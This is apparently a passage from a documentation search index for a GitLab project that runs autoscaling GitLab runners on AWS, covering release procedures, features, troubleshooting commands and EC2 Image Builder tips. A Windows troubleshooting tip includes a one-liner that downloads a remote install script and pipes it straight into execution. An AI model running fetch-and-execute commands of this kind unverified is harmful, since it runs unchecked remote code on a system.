(please do not test outside of the branch submissions and only splice over your working code - because this process frequently results in non-working code)</li> <li>Create a Merge Request (MR) back to the the <code>develop</code> branch of this repository (the MR interface likely defaults to <code>main</code> branch).</li> <li>In the MR template, be sure to specify how you tested, that you tested the exact branch code and that the test results were successful.</li> <li> <p>In the MR, ensure that <code>Allow commits from members who can merge to the target branch.</code> is checked like this screenshot. (Your repository must be public)</p> <p></p> </li> </ol>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/#prerelease-procedures","title":"Prerelease Procedures","text":"<ul> <li>a prerelease version tag will be added in the develop branch.</li> <li>each issue needs a seperate MR and dedicated branch and be merged into develop (so that changes are easy to track, test and back out)</li> <li>periodically the prerelease tag will be moved to the latest commits when testing is desired.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/#release-procedures","title":"Release Procedures","text":"<ol> <li>The version string embedded throughout the code will stay as is to enable version safety</li> <li><code>develop</code> will be merged into <code>main</code></li> <li>the templates will be pushed to the existing s3 key that contains the versoin string</li> <li>the Git version tag will be pointed at the tip of the <code>main</code> branch</li> <li>A GitLab Release will be created from the Git tag.</li> </ol> <p>The above results in the default view of the README.md and easybuttons.md pointing to the S3 bucket.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/#setting-up-a-new-development-tag","title":"Setting up a new development tag","text":"<ol> <li>Name the branch exactly as the new version with  (e.g. v1.4.5-alpha10)</li> <li>Search and replace all occurances of the old branch to the new (e.g. v1.4.2-alpha9 == replace with ==&gt; v1.4.5-alpha10)</li> <li>Files under \"runner_configs\" use raw file retrieval from gitlab to pull these files, if they might change on this branch, the retrieval must be updated to isolate to the branch by replacing occurances of <code>/-/raw/main/</code> with <code>/-/raw/v1.4.5-alpha10/</code></li> <li>In the public S3 bucket that houses the templates, create a new version key (subdirectory) with the same name (e.g. v1.4.5-alpha10)</li> </ol>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/#releasing","title":"Releasing","text":"<ol> <li>Ensure that 5ASGAutoScalingMaxSize, Default: 20 is set - to prevent overrun of tests against Gitlab.com</li> <li>Merge to main WITHOUT deleting the branch.  If you accidentally delete it, immediately recreate it from the merge to main.</li> <li>Apply the git tag \"latest\" to this version on the local git repository and force push tags.</li> <li>Create a GitLab release and tag from the default branch using the version tag.</li> <li>Merge to any special releases WITHOUT deleting the branch (e.g. \"experimental\" for the experiment that links GitLab Runner UI to this project).</li> </ol> <p>Technically when files are loaded from main (like easy button markdowns or cloudformation templates) - key parts are pointing to the branch and the S3 url by the same name. The reference to the runner script will refer back to the branch you merged from.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/","title":"Features of GitLab HA Scaling Runner Vending Machine for AWS","text":"<p>\u0010High Availability, Elastic Scaling, Spot &amp; Windows</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#table-of-contents","title":"Table of Contents","text":"<p>[[TOC]]</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#scaled-runner-management-built-in","title":"Scaled Runner Management Built-In","text":"<ul> <li>Upgrading, Downgrading, Scaling by updating CloudFormation Stack. (e.g. Changing Instance Type, GitLab Runner Version, Scaling parameters)</li> <li>Latest AMI and/or OS Patching by updating CloudFormation Stack.</li> <li>Latest Runner Version and Version Pegging (Configurable).</li> <li>Latest AWS Prepared AMI Lookup, Custom AMI Pegging.</li> <li>GitLab Runner naming with account and instance id to facilitate finding a runner in your AWS accounts.</li> <li>AWS Tagging with GitLab Runner tags and instance URL to allow location of instance in GitLab Instance(s).</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#runner-cost-management-built-in","title":"Runner Cost Management Built-In","text":"<ul> <li>Developer Self-Service through CloudFormation Direct Launch and Compatiblity with AWS Service Catalog for Enterprises.</li> <li>Flexible leveraging of spot compute.</li> <li>Configurable scheduled shutdown and/or startup for runners that do not need to run 24x7. For instance, you save 76% when a runner is scheduled for 40 hours a week ((168-40/168)=76%)</li> <li>Configurable to use AWS Graviton (arm) for Linux OS based runners.</li> <li>Blog post on savings using spot, arm and scheduling: How to provision 100 AWS Graviton GitLab Spot Runners in 10 Minutes for $2/hour</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#runner-configuration-best-practices","title":"Runner Configuration Best Practices","text":"<ul> <li>GitLab Runner tagging for compute type (Spot/On Demand), OS, archtecture (if not x86_64), executor type - so that individual jobs can select on these attributes.  </li> <li>Runner tags enable pipeline engineers to ensure only mutable jobs run on spot runners.</li> <li>Shared Runner Cache per-asg is automatically configured and uses S3 object storage. Can override bucket name to share cache across multiple ASGs if it makes sense to do so.</li> <li>Runner deregistration and draining (for non-spot) during scale-in to prevent many dead tokens in GitLab.</li> <li>Runners are tagged when any AWS scaling schedule is in use - this helps everyone understand why a specific runner might go offline at certain times.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#security","title":"Security","text":"<ul> <li>Configurable IAM Instance Profile to avoid having to pass credentials to runner jobs.</li> <li>Least privilege when using built-in security configuration.</li> <li>Least configuration - does not configure items that are not needed to fulfill functionality indicated by configured parameters.</li> <li>The ability to choose subnets allows only private ones to be selected.</li> <li>The ability to specify security groups allows custom control of runner ingress / egress security.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#high-availability","title":"High Availability","text":"<ul> <li>Configurable with or without scaling.</li> <li>Warm HA of single instances via ASG respawning (downtime during respawn).</li> <li>Hot HA by using two instances.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#elastic-scaling","title":"Elastic Scaling","text":"<ul> <li>CPU or Memory metric.</li> <li>Stepped Scaling for faster response under steep workload increases.</li> <li>Many metrics beyond CPU and Memory are collected to CloudWatch to for visibility into Network, Disk IO or other bottlenecks - for specialty workloads and instance type tuning.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#supported-combinations-of-operating-systems-runner-executors-and-hardware-architectures","title":"Supported Combinations of Operating Systems, Runner Executors and Hardware Architectures","text":"<ul> <li>Operating Systems: Windows, Linux</li> <li>Runner Executors: Docker, Shell</li> <li>Hardware Architectures: x86_64, ARM64 (Linux Only)</li> <li>Any combination of the above.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#aws-features-and-best-practices","title":"AWS Features and Best Practices","text":"<ul> <li>Defaults to Amazon Linux 2 for better density, integration and optimization (including docker optimizations).</li> <li>ASG Launching Life Cycle Hooks to enable patching and reboots for kernel patching.</li> <li>ASG Termination Monitoring and Life Cycle Hooks to enable runner deregistration and job draining (if not a spot instance).</li> <li>Mixed Instances Policy support.</li> <li>These templates can be loaded into AWS Service Catalog to be a part of your internal self-service cloud automation.</li> <li>Stackname is used in all created resources so that all related resources can be quickly identified as related.</li> <li>Compatible with the following AWS Services and Offerings<ul> <li>AWS Quick Starts</li> <li>AWS Service Catalog (Direct Import)<ul> <li>ServiceNow via an AWS Service Catalog Connector</li> <li>Jira Service Manager via an AWS Service Catalog Connector</li> </ul> </li> <li>AWS Control Tower</li> <li>AWS SaaS Factory</li> </ul> </li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#extensibility-reusability-and-troubleshooting","title":"Extensibility, Reusability and Troubleshooting","text":"<ul> <li>Easy button CloudFormation templates and parameter sets are easily used as a pattern for anyone to add their most common or desired patterns.</li> <li>Modular, overridable runner configuration scripts.</li> <li>SSM Agent installed for gaining terminal access.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#design-heuristics","title":"Design Heuristics","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#use-boring-awsiac-technology","title":"Use Boring AWS/IaC Technology","text":"<p>In this case of this effort, sticking to broadly known, well proven AWS infrastructure the solution is open to much more tweaking and contributions by a very wide audience of GitLab users, but also the technical professionals helping GitLab customers in the entire Partner and Alliance ecosystem.  All of these professionals are also potential contributors due to familiar with the technologies in use. It also extends the reach to other APIs. Some examples of leverage well proven and broadly known (boring) AWS technology:</p> <ul> <li>Using standard ASGs for scaling orchestration.</li> <li>Using EC2 instance compute.</li> <li>Using CloudFormation as the Infrastructure as Code Language (enables this to become an AWS QuickStart). Being a QuickStart exposes the code to an even vaster body of professionals for debugging, refinement and enhancement.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#abstraction-not-elimination-of-complexity-of-sophisticated-architecture","title":"Abstraction (not Elimination) of Complexity of Sophisticated Architecture","text":"<p>As a solution becomes more sophisticated to handle use cases well or handle more cases, it naturally becomes more complex. Instead of keeping the internal implementation simple, the user experience can be abstracted.  In the case of Infrastructure as Code tooling, this generally comes down to simplifying the number of parameters that must be considered to deploy the solution for a given purpose.  There are multiple ways to front end this template with profiles of parameters to suite specific use cases.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#why-amazon-linux-2","title":"Why Amazon Linux 2?","text":"<p>AWS has engineered Amazon Linux 2 for the maxium efficiency and server density on Ec2 and for container hosts. With the newer Linux kernel it is also able to have more optimal docker performance with the overlay2 storage driver.</p> <p>The defaulting of this template does not preclude anyone from creating a custom runner configuration script for any other bistro.  Generally you want to build on the AMIs built by AWS because they tend to be optimized with at least MVNe storage drivers and ENA network drivers.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#what-instance-types","title":"What Instance Types?","text":"<p>Do not use bursty instances types (t2/t3) - especially in testing where your expecations will be formed - because their irradict behavior will confuse the results for what autoscaling can do - especially how responsive and smooth it might be for the given workloads.</p> <p>Do use nitro instances because they have MVNe storage drivers and ENA network drivers and are automatically EBS optimized.  Use a minimum of the m5 class to gain all these benefits in a general computing instance type.  Better performance may be had if you tune your instance selection to your actual workload behaviors.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#should-i-create-an-ami-with-the-runner-embedded","title":"Should I Create an AMI with the Runner Embedded?","text":"<p>Generally no - this creates an entire artifact release cycle in front of an already complex Infrastructure as Code stack - testing is long enough without that additional development cycle.  Additionally, you will likely have to update the runner binary (and maybe others) as soon as you boot an old AMI.  Many times automation to adequately replace software will take longer than starting with a clean machine.  Developing automation to \"replace an old software package\" is definitely more intense that clean slate.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/FEATURES/#built-upon","title":"Built Upon","text":"<p>The baseline for this template is the Ultimate AWS ASG Kickstart and Lab Kit with Spot Support.  It has many features and attibutes to learn about Autoscaling and spot and all of that is described here: https://gitlab.com/DarwinJS/ultimate-aws-asg-lab-kit/-/blob/master/README.md - It's worth it to read through the many features.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/","title":"Testing and Troubleshooting Guide","text":"<p>GitLab HA Scaling Runner Vending Machine for AWS</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#table-of-contents","title":"Table of Contents","text":"<p>[[TOC]]</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#accessing-specific-versions-for-testing-including-prereleases","title":"Accessing Specific Versions For Testing - Including Prereleases","text":"<p>The S3 bucket containing the templates has the version number as a key.  This allows for prerelease availability as well as pegging to older versions. This key equates to a git tag. When a prerelease is in progress, the tag will usually be pointed to a commit in the develop branch.</p> <p>To test a release simply load the README.md or easybuttons.md and change to the tag or develop branch. The CF icons in the Easy Buttons now point to the correct S3 bucket. At the bottom of the easy buttons table is access to the full versioned template near the text <code>Not an easy button person?</code>.</p> <p>Here is an example link to v1.4.8-alpha13 of easybuttons.md. If you hover the icons you can see that the s3 path includes the version number as well.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#scaling-troubleshooting-and-testing","title":"Scaling Troubleshooting and Testing","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#aws-asg-scaling-configuration-flexibility","title":"AWS ASG Scaling Configuration Flexibility","text":"<p>While this template allows:</p> <ul> <li>One high and one low threshold on</li> <li>Either CPU or Memory Utilization Metrics</li> </ul> <p>AWS ASG itself supports many alarms on many metrics.  Multi-metric / multi-alarm scaling can get complex and cause thrashing - if it is done is should be based on actual tested thresholds based on actual runner workloads.  For instance, perhaps scaling up on CPU &gt; 80% and seperately Memory Util &gt; 60% - but such a configuration should come from actual load signatures of an actual customer-like mix of runner jobs.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#considerations-and-cautions","title":"Considerations and Cautions","text":"<ul> <li>Scaling down testing is the easiest - simply launch the template with a Desired Capacity of 2 and Minimum Capacity of 1 and shortly after CloudFormation completes, the ASG will start scaling down.</li> <li>By definition ASG scaling alarms for a cluster are based on a metric for all existing hosts in the cluster.</li> <li>Many metrics that can be chosen, including GitLab CI Job Queue Length, are non-deterministic to actual ASG cluster loading - this is because individual jobs can have a very wide variety of memory and cpu utilization based on what is in them and whether they docker executor is in use. While responsiveness is important, it is also important not to hyperscale a cluster that is running at 50% overall utilization.</li> <li>Jobs that are in a polling cycle (say for external status), consume a GitLab Concurrency slot - but hardly any CPU. So CPU utilization alone does not tell a whole story.</li> <li>Docker runners will have low memory pressure even if all slots are filled if the exact same container is running for more than one of the slots because the shared container memory is reused by multiple containers. So memory utilization </li> <li>Step scaling is an AWS ASG feature that should be used to improve scale up and down responsiveness, rather than using alternative metrics.  For instance, switching to a metrics that is non-deterministic of actual ASG loading (e.g. GitLab CI Job Queue Length) may be much less efficient than a more elemental set of metrics that have proper step scaling configured for responsiveness.</li> <li>Do not run scale up utilization thresholds too high (e.g. to the levels done in managing dedicated hardware) because it will not allow for natural spikiness with individual ASG runners that receive a big job when they are at the capacity that triggers scaling.</li> <li>Concurrent job settings that are too low can prevent reaching the scale up thresholds of external metrics like CPU or Memory Utilization. In theory the Concurrent settings of a runner would be quite high - especially with docker - in order to allow general computing metrics to be relied upon to scale.</li> <li>Hyper-scaling of runners for things like ML Ops will be less sensitive to terminations and spotty slow jobs than to cost. Due to cost, these configurations will benefit from pushing harder - specifically giving values for concurrent that are beyond the hardware limits of the machine and creating sensitive step scaling to accomodate fast scaling.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#optimizations","title":"Optimizations","text":"<ul> <li>In this template, the CloudWatch agents have been configured to allow analysis of differences between AWS Instance Types and AMIs.  This can help reveal if a specific instance type is optimized for the purpose at hand.  For instance, a given ML Ops workload may be better on CPU optimized instances while another is better on Memory optimized - but running the workload on each, performance statistics can be compared.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#ways-to-test","title":"Ways To Test","text":"<ul> <li> <p>Generate Load</p> </li> <li> <p>Edit Scaling Alarms and Change Thresholds to match existing utilization</p> </li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#generating-load","title":"Generating Load","text":"<p>IMPORTANT: DO NOT use the built in CPU stressing capability of this template because at this time it prevents proper completion of CloudFormation which eventually puts the stack into Rollback.</p> <p>There is a project with a runner stressing utility here: https://gitlab.com/gitlab-org/ci-cd/gitlab-runner-stress  As with all scaled computing - please be very responsible not to run up costs by leaving scaled tests running for too long.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#troubleshooting-guide-for-all-the-iac-parts","title":"TroubleShooting Guide For All The IaC Parts","text":"<p>IMPORTANT: The number one suspected cause in debugging cloud automation is \"You probably are not being patient enough and waiting long enough to see the desired result.\" (whether waiting for automation to complete or metrics to flow or other things to trigger as designed)</p> <ul> <li>Linux: Generally assumes an AWS prepared AMI (all AWS utilities installed and configured for default operation). For Amazon Linux - assumes Amazon Linux 2. (CentOS7 Compatibile / systemd for services)</li> <li>Windows: Generally assumes AWS prepared AMI (all AWS utilities installed and configured for default operation) using upgraded AWS EC2Launch client (and NOT older EC2Config) (For AWS prepared AMIs this equates to Server 2012 and later)</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#both-operating-systems","title":"Both Operating Systems","text":"<ol> <li>Should be accessible via the SSM agent - which means zero configuration to get a command console (non-GUI on Windows) via Ec2. This obviates the need for a public address, security groups that open SSH or RDP and a Internet gateway. Use SSM for a console as follows:</li> <li>Right click an instance and choose \"Connect\"</li> <li>Select the \"Session Manager\" tab.</li> <li>Click \"Connect\".  If the button is not enabled you most likely have to wait a while until full configuration has been completed.</li> <li>IMPORTANT: If you are iterating over a runner configuration script AND you are sourcing the script from a raw git url - you do NOT need to teardown the entire stack simple to test changes to this script because it is dynamically sourced during the ASG spin up of the instance.</li> <li>Edit the ASG and set the Desired and Minimum to zero</li> <li>update the script in the git repository</li> <li>Edit the ASG and set the Desired and Minimum counts to at least 1.</li> </ol>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#linux","title":"Linux","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#linux-userdata-includes-download-and-execution-of-runner-configuraiton-script","title":"Linux Userdata (includes download and execution of runner configuraiton script)","text":"<ul> <li>Userdata Execution Log: <code>cat /var/log/cloud-init-output.log</code></li> <li>Resolved Script (CF Variables Expanded): <code>cat /var/lib/cloud/instance/scripts/part-00</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#linux-runner-configuration","title":"Linux Runner Configuration","text":"<ul> <li>Rendered Custom Runner Configuration Script: <code>cat /custom_instance_configuration_script.sh</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#linux-termination-monitoring","title":"Linux Termination Monitoring","text":"<ul> <li>Termination Monitoring Script: <code>cat /etc/cron.d/MonitorTerminationHook.sh</code></li> <li>Schedule of Termination Monitoring: <code>cat /etc/crontab</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#linux-cloudwatch-metrics","title":"Linux CloudWatch Metrics","text":"<ul> <li>Config file created by script (get's translated to a TOML): <code>cat /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.json</code></li> <li>Check running status: </li> <li><code>sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl -m ec2 -a status</code></li> <li><code>systemctl status amazon-cloudwatch-agent</code></li> <li>start: <code>systemctl start amazon-cloudwatch-agent</code></li> <li>stop: <code>systemctl stop amazon-cloudwatch-agent</code></li> <li>Tail Log: <code>tail /opt/aws/amazon-cloudwatch-agent/logs/amazon-cloudwatch-agent.log -f</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#windows","title":"Windows","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#techniques-for-non-gui-windows-troubleshooting","title":"Techniques for Non-GUI Windows Troubleshooting","text":"<ul> <li>Viewing text files in the console - windows powershell has many linux aliases - so just use cat:</li> </ul> <p><code>cat somefile.txt</code></p> <ul> <li>Use this oneliner to install the console based text file editor 'nano' on headless windows: </li> </ul> <p><code>If (!(Test-Path env:chocolateyinstall)) {iwr https://chocolatey.org/install.ps1 -UseBasicParsing | iex} ; cinst -y nano</code></p> <ul> <li>Use this oneliner to create a function to tail windows event logs in the console (similar to <code>tail -f /var/log/messages</code>):</li> </ul> <p><code>Function Tail ($logspec=\"Application\",$pastmins=5,[switch]$f,$computer=$env:computername) {$lastdate=$(Get-date).addminutes(-$pastmins); Do {$newdate=get-date;get-winevent $logspec -ComputerName $computer -ea 0 | ? {$_.TimeCreated -ge $lastdate -AND $_.TimeCreated -le $newdate} | Sort-Object TimeCreated;$lastdate=$newdate;start-sleep -milliseconds 330} while ($f)}; Tail</code></p> <p>Tail takes positional parameters the first one is a log spec which can contain a comma seperated list and wildcards like this (for Appliation and Security logs for the last 10 minutes and waiting for more):</p> <p><code>Tail Applica\\*,Securi\\* 10</code></p> <p>Note: This is useful for tailing the Application log to watch whether the termination script is processing as desired.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#windows-userdata","title":"Windows Userdata","text":"<ul> <li>Userdata Execution Log: <code>cat C:\\programdata\\Amazon\\EC2-Windows\\Launch\\Log\\UserdataExecution.log</code></li> <li>Resolved Script (CF Variables Expanded): <code>cat C:\\Windows\\TEMP\\UserScript.ps1</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#windows-runner-configuration","title":"Windows Runner Configuration","text":"<ul> <li>Rendered Custom Runner Configuration Script: <code>cat $env:public\\custom_instance_configuration_script.ps1</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#windows-termination-monitoring","title":"Windows Termination Monitoring","text":"<ul> <li>Termination Monitoring Script: <code>cat $env:public\\MonitorTerminationHook.ps1</code></li> <li>Schedule of Termination Monitoring: <code>schtasks /query /TN MonitorTerminationHook.ps1</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/TESTING-TROUBLESHOOTING/#windows-cloudwatch-metrics","title":"Windows CloudWatch Metrics","text":"<ul> <li>Config file created by script (get's translated to a TOML and deleted - so if it is actually here that is a problem): <code>cat $env:ProgramFiles\\Amazon\\AmazonCloudWatchAgent\\config.json</code></li> <li>Check running status: </li> <li><code>sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl -m ec2 -a status</code></li> <li><code>systemctl status amazon-cloudwatch-agent</code></li> <li>start: <code>systemctl start amazon-cloudwatch-agent</code></li> <li>stop: <code>systemctl stop amazon-cloudwatch-agent</code></li> <li>Tail operational Log: <code>cat C:\\ProgramData\\Amazon\\AmazonCloudWatchAgent\\Logs\\amazon-cloudwatch-agent.log</code></li> <li>Configuration validation log: <code>cat C:\\ProgramData\\Amazon\\AmazonCloudWatchAgent\\Logs\\configuration-validation.log</code></li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/easybuttons/","title":"GitLab HA Scaling Runner Vending Machine for AWS","text":"<p>Note: The easy button code in this project is easy to reuse as a pattern to create your own easy button setups for the CloudFormation Console UI or the CLI.</p> <p>Note: That you can deploy as many of these as you wish as many times as you wish to build runner clusters with the appropriate attributes.</p> <p>Note: The automation that underlies the Easy Buttons complies with Amazon Well Architected and is capable of being used directly or as a template starting point for creating very advanced Runner ASGs.  Learn more here: https://gitlab.com/guided-explorations/aws/gitlab-runner-autoscaling-aws-asg</p> <p>Note: The easy buttons use default VPC, default subnets and default security groups. Once you've explored using an easy button, you will need to use the full template to specify these elements. See \"Not An Easy Button Person?\" below.</p> Easy Buttons Name Description Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. Non-spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable. Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. No Spot.Default choice for Linux Docker executor. Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. 100% spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. 100% Spot. Windows 2019 Shell with Manual Scaling and Optional Scheduling. Scaling and Optional Scheduling. Non-spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. Default choice for Windows Shell executor. Windows 2019 Shell with Manual Scaling and Optional Scheduling. 100% spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. 100% Spot. ARM64 Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. Non-spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable. Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet.No Spot. ARM64 Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. 100% spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. 100% Spot. More Advanced Options Including AutoScaling Amazon Linux 2 Docker Simple Scaling Ondemand Instances Two docker executors, scaling based on simple CPU metrics, only spotNote: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Amazon Linux 2 Docker Simple Scaling Spot Instances Two docker executors, scaling based on simple CPU metrics, only spotNote: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Amazon Linux 2 Docker Simple Scaling Spot and Ondemand Instances (Mixed Instances) Two docker executors, scaling based on simple CPU metrix, 50/50 mix of spot and ondemand.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Windows 2019 Shell Simple Scaling Ondemand Instances Two docker executors, scaling based on simple CPU metrics, no spot.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Windows 2019 Shell Simple Scaling Spot Instances Two docker executors, scaling based on simple CPU metrics, only spot.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Windows 2019 Shell Simple Scaling Spot and Ondemand Instances (Mixed Instances) Two docker executors, scaling based on simple CPU metrics, 50/50 mix of spot and ondemand.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. <p>Not An Easy Button Person? If easy buttons aren't your thing, click here to load the full template in CloudFormation - the help text in the parameters gives a lot of information - but you may also need to consult this documentation:  (Recommended: add the tags Product=GitLab, Function=GitLabRunner)</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/","title":"Index","text":"<p>EC2 Image Builder is very convenient way to build and distribute and share golden AMI images.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/#advantages","title":"Advantages","text":"<ul> <li>It is much less work that getting packer running (which this author has done on and off Amazon) - packer requires that the build agent and the instance being built are network routable, have security groups configured and that the receiving instance have winrm configured.</li> <li>It does not open up WinRM which is frequently left in a wide-open state just because it was used to provision a golden image with Packer. WinRM has not API call to return it to a pristine state (not a disabled state, an \"as if never used\" state). Read more about the problem and a chocolatey package that tries to solve it WinRM For Provisioning - Close The Door On The Way Out Eh! and </li> <li>it has automation for deploying the AMI to regions and permissioning it to accounts.</li> <li>it supports revisions of all it's objects</li> <li>it supports scheduled runs</li> <li>it supports AWS License Manager</li> <li>it logs builds to CloudWatch</li> <li>AWS provides STIG build components for preparing GovCloud images</li> </ul> <p>It is a meta-PaaS in that it is a service that completely simplifies building pipelines for building OS images - which usually have many unique challenges compared to standard software building pipelines.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/#first-time-user-gotchas-for-building-windows-amis-with-ec2-image-builder","title":"First Time User Gotchas for Building Windows AMIs with EC2 Image Builder","text":"<ul> <li>It seems like AWS EC2 Image Builder does not continue after running the included component ec2-image-builder/windows-same-as-gitlab-com.yml on the AWS Windows 2019 Full AMI, yet the exact same component works fine with AWS Windows 2016 Full AMI.</li> <li>If you change the directory the \"Working directory\" because you don't like stuff in the root of C: (as we've all been taught about Windows best practices for quite some time), be sure to choose a directory that already exists - it's extremely hard to find the root cause when you pick a non-existing directory - especially if you are new to automating Windows builds on AWS.  You might want to use c:\\users\\public.  Note that the reversed slash on the default \"C:/\" does work because it is processed by PowerShell which can tolerate either slash for file system references. Note that there is no residue left on C:\\ if you leave it at the default.</li> <li>Make sure to choose a large volume size.  AWS defaults to 30GB for Windows and Visual Studio takes way more than that. This is another area where the root cause of your failure will be very challenging to find. Probably 300 to 500 GB if you don't actually know what your CI build machine requires. Be sure to leave lots of working space.</li> <li>For some reason during my testing the direct build log links from EC2 Image Builder to CloudWatch logs were incorrect.  The logs are still there if you look manually, but the links go to a non-existent location.</li> <li>If you are building additional components, the AWS component validator does not like certain syntax at the start of a line that is valid powershell.  For instance <code>@(\"item1\",\"item2\") | foreach {write-host \"Item is $psitem\"}</code>.  If you run into this there is usally a way to recraft your PowerShell to make it happy.  In this case <code>write-host (\"item1\",\"item2\") | foreach {write-host \"Item is $psitem\"}</code> works fine.</li> <li>The web editors for your components in the AWS EC2 Image Builder console allow smart quotes.  These are death for PowerShell.  Thankfully you can visually distinguish them in the editor and if you watch carefully the syntax editor will not highlight the quoted content when a smart quote is used - a cue that you may have a smart quote.  </li> <li>I have found cases where powershell that I test prospective powershell code in an AMI built by EC2 Image Builder and that code does not work during an EC2 Image Builder build.  For instance, this <code>` had to be updated to this</code>copy-item \"C:\\Users\\Public\\MSBuild.Microsoft.VisualStudio.Web.targets.11.0.2.1\\tools\\VSToolsPath*\" \u201cC:\\Program Files (x86)\\MSBuild\\Microsoft\\VisualStudio\\v11.0\u201d 